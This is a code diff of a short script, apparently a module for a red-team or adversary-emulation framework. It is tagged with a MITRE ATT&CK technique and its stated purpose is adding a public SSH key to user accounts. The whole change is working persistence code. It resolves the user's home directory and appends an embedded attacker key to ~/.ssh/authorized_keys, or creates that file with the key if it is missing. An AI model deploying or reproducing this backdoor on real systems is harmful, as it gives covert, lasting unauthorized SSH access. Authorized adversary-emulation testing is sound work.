@@ -3,7 +3,7 @@
 // Purpose: add a public ssh key to users accounts
 // ATT&CK: https://attack.mitre.org/wiki/Technique/T1145
 
-//import:/home/<USERNAME>/.ssh/id_rsa.pub
+//import:/root/.ssh/id_rsa.pub
 
 // NOTE: You will need to update the path to the public key in order to import without an error
 
@@ -12,12 +12,15 @@ function BeforeDeploy() {
 }
 
 function Deploy() {
-    try {
-        AppendFileBytes("~/.ssh/authorized_keys", Asset("id_rsa.pub").fileData);
-    } catch (e) {
-        WriteFile("~/.ssh/authorized_keys", Asset("id_rsa.pub").fileData, 400);
+    var filename = USER_INFO.home_dir + "/.ssh/authorized_keys";
+    var stat = FileExists(filename);
+    if (stat.fileExists) {
+        LogInfo("SSH key appended");
+        AppendFileBytes(filename, Asset("id_rsa.pub").fileData);
+    } else {
+        LogInfo("SSH key added");
+        WriteFile(filename, Asset("id_rsa.pub").fileData, 400);
     }
-    LogInfo("SSH key added");
     return true;
 }
 
